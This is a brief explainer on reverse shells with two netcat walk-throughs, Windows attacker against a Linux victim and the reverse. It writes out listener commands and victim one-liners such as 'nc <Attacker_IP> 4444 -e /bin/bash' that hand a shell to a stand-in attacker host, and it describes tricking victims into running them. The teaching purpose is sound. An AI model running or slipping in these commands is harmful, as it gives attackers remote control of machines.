# What is Reverse shell access

A reverse shell is a type of connection where a target machine (the victim) initiates a connection back to an attacker’s machine. This allows the attacker to control the target machine remotely by executing commands on it.

# How Reverse Shell Works:

Attacker's Machine: Listens for incoming connections.

Victim's Machine: When compromised, it connects back to the attacker's machine, giving the attacker remote access.

# Two Simple Examples:

# Example 1: Attacker on Windows, Victim on Linux
**Attacker (Windows)**: Sets up a listener using netcat.

**Command**: nc -lvp 4444

**This means**: "Listen on port 4444 and wait for a connection."

**Victim** (Linux): The attacker tricks the victim into running a command.

**Command**: nc <**Attacker_IP**> 4444 -e /bin/bash

**This means**: "Connect to the attacker's IP on port 4444 and give them access to my shell."

**Result**: The attacker now controls the Linux machine from the Windows machine.

# Example 2: Attacker on Linux, Victim on Windows
**Attacker** (Linux): Listens for incoming connections.

**Command**: nc -lvp 5555

**Victim** (Windows): The attacker gets the victim to run this command.

**Command**: nc <**Attacker_IP**> 5555 -e cmd.exe

**This means**: "Connect to the attacker’s IP on port 5555 and give them access to my Windows command prompt."

**Result**: The attacker now has control over the Windows machine.

# In Summary:
**Reverse Shell**: The victim's machine connects back to the attacker's machine.
**Purpose**: Allows remote control over the victim's machine.
**Usage**: Often used in penetration testing or by hackers.
